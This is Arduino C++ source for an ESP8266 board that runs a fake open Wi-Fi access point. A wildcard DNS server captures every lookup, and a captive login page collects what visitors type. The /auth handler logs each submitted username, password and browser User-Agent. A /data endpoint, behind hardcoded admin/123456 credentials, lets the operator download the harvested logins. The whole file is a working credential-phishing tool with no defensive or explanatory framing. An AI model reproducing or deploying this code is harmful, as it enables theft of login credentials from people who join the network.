#include <ESP8266WebServer.h>
#include <ESP8266HTTPUpdateServer.h>
#include <ESP8266HTTPClient.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include <html.h>
#include <utils.h>

ESP8266WebServer webServer(80);
DNSServer dnsServer;

IPAddress apIP(69, 69, 69, 1);
const uint16_t DNS_PORT = 53;

void requireAuthentication() {
  if (!webServer.authenticate("admin", "123456"))
	return webServer.requestAuthentication();
}

void setupCaptive() {
  startLilFS();
  copyWebFiles();

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("gopfetami", "");
  dnsServer.start(DNS_PORT, "*", apIP);

  webServer.onNotFound([]() {
	if (LittleFS.exists("/captive.html")) {
	  File file = LittleFS.open("/captive.html", "r");
	  webServer.streamFile(file, "text/html");
	  file.close();
	}
  });

  webServer.on(String(F("/auth")), HTTP_POST, []() {
	String url = webServer.arg("url");
	String user = webServer.arg("user");
	String password = webServer.arg("password");
	String userAgent;

	if (webServer.hasHeader("User-Agent")) {
	  userAgent = webServer.header("User-Agent");
	} else {
	  userAgent = "Unknown";
	}

	String x = user + ":" + password + " -> " + userAgent;
	logging(x);
	if (LittleFS.exists("/response.html")) {
	  File file = LittleFS.open("/response.html", "r");
	  webServer.streamFile(file, "text/html");
	  file.close();
	}
  });

  webServer.on(String(F("/data")), HTTP_GET, []() {
	requireAuthentication();
	if (LittleFS.exists("/logindata")) {
	  File file = LittleFS.open("/logindata", "r");
	  webServer.streamFile(file, "application/json");
	  file.close();
	}
  });

  webServer.begin();
}